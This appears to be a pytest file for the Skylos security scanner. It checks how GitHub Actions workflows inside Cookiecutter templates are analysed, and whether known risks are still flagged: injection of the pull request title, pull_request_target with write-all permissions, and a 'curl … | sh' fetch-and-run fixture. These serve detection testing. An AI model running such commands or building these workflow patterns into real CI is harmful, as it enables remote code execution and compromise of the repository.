"""Parse inert Cookiecutter workflow inputs without evaluating generator code."""

from pathlib import Path

import pytest

from skylos.core.safe_cache_io import read_text_no_symlink, write_text_no_symlink
from skylos.rules.config.cicd.github_actions import (
    scan_github_actions,
    scan_github_actions_file,
)

_VARIABLE = "{{ cookiecutter.library_name }}"
_ESCAPED_TITLE = "{{ '${{ github.event.pull_request.title }}' }}"
_SAFE_WORKFLOW = (
    "name: Template CI\n"
    "on: push\n"
    "permissions: {}\n"
    "jobs:\n"
    "  check:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - run: echo safe\n"
)


def _write(path: Path, text: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    assert write_text_no_symlink(path, text, encoding="utf-8")
    return path


def _template(tmp_path: Path, text: str) -> Path:
    generator = tmp_path / "templates" / "library"
    _write(generator / "cookiecutter.json", '{"library_name": "fixture"}\n')
    return _write(generator / _VARIABLE / ".github" / "workflows" / "ci.yml", text)


def _scan(root: Path, path: Path | None = None):
    errors = []
    if path is None:
        findings = scan_github_actions(root, analysis_errors=errors)
    else:
        findings = scan_github_actions_file(path, root=root, analysis_errors=errors)
    return findings, errors


def _assert_incomplete(root: Path, path: Path) -> None:
    findings, errors = _scan(root, path)
    assert findings == []
    assert len(errors) == 1
    assert errors[0]["rule_id"] == "SKY-ANALYSIS-INCOMPLETE"
    assert errors[0]["kind"] == "config_parse_error"
    assert errors[0]["component"] == "github_actions"
    assert errors[0]["file"] == str(path)
    assert errors[0]["line"] == 1
    assert errors[0]["severity"] == "HIGH"


@pytest.mark.parametrize("quote", ["'", '"'])
def test_static_github_expression_escape_is_analyzed_not_executed(tmp_path, quote):
    escaped = "{{ " + quote + "${{ github.event.pull_request.title }}" + quote + " }}"
    text = _SAFE_WORKFLOW.replace("run: echo safe", "run: echo " + escaped)
    workflow = _template(tmp_path, text)
    findings, errors = _scan(tmp_path)
    assert errors == []
    injection = [finding for finding in findings if finding["rule_id"] == "SKY-D294"]
    assert len(injection) == 1
    assert injection[0]["file"] == str(workflow)
    assert injection[0]["line"] == 8
    assert read_text_no_symlink(workflow, max_bytes=10_000) == text


@pytest.mark.parametrize("event", ["push", "pull_request"])
@pytest.mark.parametrize("field", ["paths", "paths-ignore"])
@pytest.mark.parametrize("quoted", [False, True], ids=["plain", "quoted"])
def test_generated_display_name_and_event_paths_are_supported(
    tmp_path, event, field, quoted
):
    value = f'"{_VARIABLE}/**"' if quoted else f"{_VARIABLE}/**"
    text = _SAFE_WORKFLOW.replace(
        "name: Template CI\non: push\n",
        f"name: {_VARIABLE} CI\non:\n  {event}:\n    {field}:\n      - {value}\n",
    )
    _template(tmp_path, text)
    assert _scan(tmp_path) == ([], [])


def test_template_security_findings_keep_original_file_and_lines(tmp_path):
    text = (
        f"name: {_VARIABLE} CI\n"
        "on:\n"
        "  pull_request_target:\n"
        "    paths:\n"
        f"      - {_VARIABLE}/**\n"
        "permissions: write-all\n"
        "jobs:\n"
        "  check:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        f"      - run: echo {_ESCAPED_TITLE}\n"
    )
    workflow = _template(tmp_path, text)
    findings, errors = _scan(tmp_path)
    assert errors == []
    expected_lines = {"SKY-D290": 3, "SKY-D292": 11, "SKY-D294": 12}
    for rule_id, line in expected_lines.items():
        matches = [finding for finding in findings if finding["rule_id"] == rule_id]
        assert len(matches) == 1, rule_id
        assert matches[0]["file"] == str(workflow)
        assert matches[0]["line"] == line
    assert read_text_no_symlink(workflow, max_bytes=10_000) == text


@pytest.mark.parametrize("comment", ["inline", "preceding", "quoted"])
def test_normalization_preserves_raw_ignore_comment_scope(tmp_path, comment):
    prefix = "      - run: echo "
    script = _ESCAPED_TITLE
    if comment == "inline":
        script += " # skylos: ignore[SKY-D294]"
    elif comment == "preceding":
        prefix = "      # skylos: ignore[SKY-D294]\n" + prefix
    text = _SAFE_WORKFLOW.replace("      - run: echo safe", prefix + script)
    if comment == "quoted":
        text = text.replace("Template CI", '"# skylos: ignore[SKY-D294]"')
    workflow = _template(tmp_path, text)
    findings, errors = _scan(tmp_path)
    assert errors == []
    injection = [finding for finding in findings if finding["rule_id"] == "SKY-D294"]
    if comment == "quoted":
        assert len(injection) == 1
        assert injection[0]["line"] == 8
    else:
        assert injection == []
    assert read_text_no_symlink(workflow, max_bytes=10_000) == text


@pytest.mark.parametrize("inline_ignore", [False, True])
def test_normalized_run_keeps_location_and_cannot_borrow_top_file_ignore(
    tmp_path, inline_ignore
):
    command = "curl https://example.invalid/a | sh # {{ '${{ github.sha }}' }}"
    if inline_ignore:
        command += " # skylos: ignore[SKY-D328]"
    text = "# skylos: ignore[SKY-D328]\n" + _SAFE_WORKFLOW.replace(
        "Template CI", _VARIABLE
    ).replace("run: echo safe", "run: " + command)
    workflow = _template(tmp_path, text)
    findings, errors = _scan(tmp_path)
    assert errors == []
    matches = [finding for finding in findings if finding["rule_id"] == "SKY-D328"]
    if inline_ignore:
        assert matches == []
    else:
        assert len(matches) == 1
        assert matches[0]["file"] == str(workflow)
        assert matches[0]["line"] == 9
    assert read_text_no_symlink(workflow, max_bytes=10_000) == text


@pytest.mark.parametrize(
    "dynamic",
    [
        "{{ cookiecutter.library_name.upper() }}",
        "{{ cookiecutter.library_name | upper }}",
        "{{ cookiecutter['library_name'] }}",
        "{{ unknown_value }}",
        "{% if cookiecutter.library_name %}CI{% endif %}",
        "{# generator comment #}",
        "{{ '${{ github.event.pull_request.title }}' | upper }}",
        "{{ '${{ github.event.pull_request.title }}\\n' }}",
        "{{ '${{ github.event.pull_request.title }}\n' }}",
        "${{ cookiecutter.command }}",
        "${{ (cookiecutter.command) }}",
        "${{\n cookiecutter.command\n }}",
    ],
    ids=[
        "call", "filter", "lookup", "unknown", "control-tag", "jinja-comment",
        "literal-filter", "literal-escape", "literal-newline",
        "dollar-variable", "dollar-parenthesized", "dollar-multiline",
    ],
)
def test_unknown_or_nonliteral_jinja_remains_incomplete(tmp_path, dynamic):
    workflow = _template(tmp_path, _SAFE_WORKFLOW.replace("Template CI", dynamic))
    _assert_incomplete(tmp_path, workflow)


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("run: echo safe", f"run: echo {_VARIABLE}"),
        ("run: echo safe", f"uses: {_VARIABLE}/action@v1"),
        ("permissions: {}", f"permissions: {_VARIABLE}"),
        ("runs-on: ubuntu-latest", f"runs-on: {_VARIABLE}"),
        ("on: push", f"on: {_VARIABLE}"),
        ("  check:", f"  {_VARIABLE}:"),
        ("    steps:", f"    if: {_VARIABLE}\n    steps:"),
        ("    steps:", f"    env:\n      COMMAND: {_VARIABLE}\n    steps:"),
    ],
    ids=["run", "uses", "permissions", "runner", "trigger", "job-id", "if", "env"],
)
def test_generated_security_controls_are_not_assumed_safe(tmp_path, old, new):
    workflow = _template(tmp_path, _SAFE_WORKFLOW.replace(old, new))
    _assert_incomplete(tmp_path, workflow)


def test_display_variable_alias_used_in_run_remains_incomplete(tmp_path):
    text = _SAFE_WORKFLOW.replace("Template CI", "&display " + _VARIABLE)
    workflow = _template(tmp_path, text.replace("run: echo safe", "run: *display"))
    _assert_incomplete(tmp_path, workflow)


def test_variable_cannot_collide_with_literal_escape_placeholder(tmp_path):
    text = _SAFE_WORKFLOW.replace(
        "Template CI", "{{ '${{ github.sha }}' }}"
    ).replace("run: echo safe", "run: {{ cookiecutter.LITERAL_0 }}")
    workflow = _template(tmp_path, text)
    _assert_incomplete(tmp_path, workflow)


def test_raw_internal_placeholder_is_not_treated_as_verified_template(tmp_path):
    workflow = _template(
        tmp_path, _SAFE_WORKFLOW.replace("Template CI", "__SKYLOS_COOKIECUTTER_fake__")
    )
    _assert_incomplete(tmp_path, workflow)


@pytest.mark.parametrize("graph", ["cyclic", "over-depth"])
def test_normalized_templates_still_enforce_yaml_graph_limits(tmp_path, graph):
    if graph == "cyclic":
        extra = "extra: &cycle {nested: *cycle}\n"
    else:
        extra = "extra: " + "{nested: " * 110 + "leaf" + "}" * 110 + "\n"
    workflow = _template(
        tmp_path, _SAFE_WORKFLOW.replace("Template CI", _VARIABLE) + extra
    )
    _assert_incomplete(tmp_path, workflow)


@pytest.mark.parametrize(
    "manifest",
    [None, "{", "[]", '{"other_name": "fixture"}'],
    ids=["missing", "invalid-json", "not-mapping", "undeclared-directory-variable"],
)
def test_template_requires_adjacent_valid_manifest(tmp_path, manifest):
    generator = tmp_path / "templates" / "library"
    if manifest is not None:
        _write(generator / "cookiecutter.json", manifest)
    workflow = _write(
        generator / _VARIABLE / ".github" / "workflows" / "ci.yml",
        _SAFE_WORKFLOW.replace("Template CI", _VARIABLE),
    )
    _assert_incomplete(tmp_path, workflow)


def test_nonadjacent_manifest_does_not_prove_template(tmp_path):
    _write(tmp_path / "cookiecutter.json", '{"library_name": "fixture"}')
    workflow = _write(
        tmp_path / "templates" / _VARIABLE / ".github" / "workflows" / "ci.yml",
        _SAFE_WORKFLOW.replace("Template CI", _VARIABLE),
    )
    _assert_incomplete(tmp_path, workflow)


def test_symlinked_manifest_does_not_prove_template(tmp_path):
    generator = tmp_path / "templates"
    generator.mkdir()
    target = _write(tmp_path / "metadata.json", '{"library_name": "fixture"}')
    (generator / "cookiecutter.json").symlink_to(target)
    workflow = _write(
        generator / _VARIABLE / ".github" / "workflows" / "ci.yml",
        _SAFE_WORKFLOW.replace("Template CI", _VARIABLE),
    )
    _assert_incomplete(tmp_path, workflow)


@pytest.mark.parametrize(
    "marker", ["root-ancestor", "root-name", "workflow-filename", "after-github"]
)
def test_active_workflows_do_not_gain_template_exemption(tmp_path, marker):
    if marker == "root-ancestor":
        root = tmp_path / _VARIABLE / "repo"
    elif marker == "root-name":
        root = tmp_path / _VARIABLE
    else:
        root = tmp_path / "repo"
    _write(root / "cookiecutter.json", '{"library_name": "fixture"}')
    if marker in {"root-ancestor", "root-name"}:
        _write(root.parent / "cookiecutter.json", '{"library_name": "fixture"}')
    relative = Path(".github") / "workflows" / "ci.yml"
    if marker == "workflow-filename":
        relative = relative.with_name(_VARIABLE + ".yml")
    elif marker == "after-github":
        relative = Path(".github") / "workflows" / _VARIABLE / "ci.yml"
    workflow = _write(
        root / relative,
        _SAFE_WORKFLOW.replace("Template CI", _VARIABLE),
    )
    _assert_incomplete(root, workflow)


def test_file_only_scan_has_no_cookiecutter_project_proof(tmp_path):
    workflow = _template(
        tmp_path,
        _SAFE_WORKFLOW.replace("Template CI", _VARIABLE),
    )
    errors = []
    assert scan_github_actions_file(workflow, analysis_errors=errors) == []
    assert len(errors) == 1
    assert errors[0]["kind"] == "config_parse_error"
    _assert_incomplete(workflow, workflow)


def test_unsupported_template_does_not_hide_other_workflow_findings(tmp_path):
    unsupported = _template(
        tmp_path, _SAFE_WORKFLOW.replace("Template CI", "{{ unknown_value }}")
    )
    active = _write(
        tmp_path / ".github" / "workflows" / "active.yml",
        _SAFE_WORKFLOW.replace("run: echo safe", "uses: actions/checkout@v4"),
    )
    findings, errors = _scan(tmp_path)
    assert {finding["file"] for finding in findings} == {str(active)}
    assert "SKY-D292" in {finding["rule_id"] for finding in findings}
    assert len(errors) == 1
    assert errors[0]["file"] == str(unsupported)
    assert errors[0]["kind"] == "config_parse_error"
